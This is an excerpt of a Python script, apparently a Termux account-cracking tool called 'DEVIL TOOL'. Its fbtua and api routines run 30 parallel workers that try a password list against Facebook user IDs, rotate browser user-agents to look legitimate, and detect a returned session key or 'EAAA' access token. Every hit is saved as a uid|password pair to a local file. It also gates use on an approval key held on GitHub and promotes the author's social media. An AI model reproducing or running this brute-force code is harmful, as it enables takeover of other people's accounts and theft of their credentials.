...
def helpnote():
	print("%s [=>] FOLLOW ME ON  FB PAGE TO KNOW ABOUT ME  :)"%(G))
	#yahan nichy httsp sy hata kr apna github aproval link dalna
	subprocess.check_output(["am", "start", "https://github.com/DEVIL-NAJMUL/app/blob/main/approval.txt"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK PAGE : https://www.facebook.com/DEVIL.NAJMUL")
...
def notice():
	...
	runtxt("\n\033[0;97m  Free 2009 cloning 1st JOIN MY GROUP  ")
	...
	runtxt("\033[0;97m Send Your Key On My WhatsApp ")
	os.system("xdg-open https://wa.me/01977073308")
	subprocess.check_output(["am", "start", "https://www.facebook.com/DEVIL.NAJMUL"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/DEVIL-NAJMUL/app/blob/main/approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;32m╚══════════════════════════════════════════════════════════╝\033[1;37m
    """)
		...
		print("───────────────────────────────────────────────────────× ")
		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m FOLLOW MY FB ACCOUNT  \x1b[0m\x1b[1;97m] \033[1;37m ")
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [=>] USE %s, %s(UMMAH)%s FOR SEPARATOR "%(Y,G,B,Y))
				...
				print("\033[0;92m[=×>]\033[0;92m NOTE : ENJOY DEVIL TOOL")
				print("\033[0;92m[=×>]\033[0;92m NOTE : 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗔𝗜𝗥𝗢𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗𝗘 𝗙𝗢𝗥 10 𝗦𝗘𝗖𝗦 ")
				print("\033[0;97m───────────────────────────────────────────────────────× ")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n    [=>] CRACK COMPLETE...\n\033[0;92m >>[THANKS FOR USING DEVIL TOOL...")
...
'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[DEVIL🥵😽]%s | %s\033[1;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("DEVIL🥵😽.txt","a").write(" %s|%s\n"%(uid, pw))
				break
 ...
 #XOHAN copy krke apna name dal dyna
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  \n") 
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://facebook.com/nayan.2.pja ")
